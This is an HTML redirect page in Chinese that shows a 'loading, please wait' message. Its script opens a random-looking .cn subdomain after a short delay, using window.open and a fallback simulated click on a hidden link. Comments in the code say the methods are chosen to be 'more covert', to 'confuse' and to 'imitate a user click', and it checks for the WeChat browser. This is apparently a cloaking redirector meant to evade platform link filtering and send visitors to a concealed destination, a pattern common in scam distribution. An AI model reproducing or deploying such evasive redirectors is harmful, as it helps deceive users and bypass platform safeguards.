<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>正在跳转...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f7f7f7;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #999;
    }
  </style>
</head>
<body>
  <div>页面加载中，请稍候...</div>

  <script>
    // 微信环境判断（非标准，但可混淆）
    const isWeChat = navigator.userAgent.toLowerCase().includes('micromessenger');

    // 模拟用户行为点击跳转（更隐蔽）
    function simulateClickJump(url) {
      const a = document.createElement('a');
      a.href = url;
      a.rel = 'noopener noreferrer';
      a.style.display = 'none';
      a.target = '_blank';
      document.body.appendChild(a);

      const evt = new MouseEvent('click', {
        bubbles: true,
        cancelable: true,
        view: window
      });

      a.dispatchEvent(evt);
    }

    setTimeout(() => {
      const realURL = 'https://qertyuiopasdfghjklz.5zym10.cn/h5/#/';

      // 使用 window.open 增加模拟行为（部分环境更隐蔽）
      try {
        const newWin = window.open();
        newWin.opener = null;
        newWin.location = realURL;
      } catch (e) {
        // fallback 模拟点击
        simulateClickJump(realURL);
      }
    }, 1200); // 延迟时间可调，模仿用户点击
  </script>
</body>
</html>
